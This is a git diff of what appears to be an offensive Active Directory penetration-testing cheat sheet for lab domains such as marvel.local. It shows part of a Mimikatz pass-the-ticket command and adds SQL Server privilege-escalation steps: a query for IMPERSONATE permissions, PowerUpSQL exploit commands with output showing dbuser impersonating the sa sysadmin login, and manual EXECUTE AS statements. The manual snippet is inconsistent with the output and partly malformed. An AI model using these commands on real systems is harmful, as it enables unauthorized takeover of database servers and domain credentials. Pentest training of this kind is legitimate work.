@@ -148,7 +148,7 @@ Description           : Key Distribution Center Service Account
 SPNServers            :
 SPNTypes              : {kadmin}
 ServicePrincipalNames : {kadmin/changepw}
-​
+
 Domain                : marvel.local
 UserID                : spn1
 PasswordLastSet       : 01/07/2020 08:31:28
@@ -267,6 +267,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.marvel.local@US.MA
 ```
 
 ### SQL Server Escalation
+#### Impersonate SQL User
 Check impersonation possibilities:
 ```
 PS C:\> Get-SQLQuery -Instance $instance -Verbose -Query "select distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
@@ -277,16 +278,28 @@ name
 sa
 dbuser
 ```
-Impersonate using PowerUpSQL
+Using PowerUpSQL:
+```
+Invoke-SQLAuditPrivImpersonate -Username $username -Password $password -Instance MVU-SQL.us.marvel.local -Verbose
+```
 
+Impersonate using PowerUpSQL
 ```
 PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Instance $instance -Verbose -Exploit
-VERBOSE: UFC-SQLDev.us.funcorp.local : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
-VERBOSE: UFC-SQLDev.us.funcorp.local : CONNECTION SUCCESS.
-VERBOSE: UFC-SQLDev.us.funcorp.local : - Logins can be impersonated.
-VERBOSE: UFC-SQLDev.us.funcorp.local : - dbuser can impersonate the sa sysadmin login.
-VERBOSE: UFC-SQLDev.us.funcorp.local : - EXPLOITING: Starting exploit process...
+VERBOSE: MVU-SQL.us.marvel.local  : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
+VERBOSE: MVU-SQL.us.marvel.local  : CONNECTION SUCCESS.
+VERBOSE: MVU-SQL.us.marvel.local  : - Logins can be impersonated.
+VERBOSE: MVU-SQL.us.marvel.local  : - dbuser can impersonate the sa sysadmin login.
+VERBOSE: MVU-SQL.us.marvel.local  : - EXPLOITING: Starting exploit process...
 ```
+
+Impersonate Manualy 
+```
+EXECUTE AS LOGIN = 'dbadmin'
+EXECUTE AS = 'sa'
+SELECT IS_SRVROLEMEMBER('sysadmin')
+```
+
 
 ## Persistence
 ### DC Sync
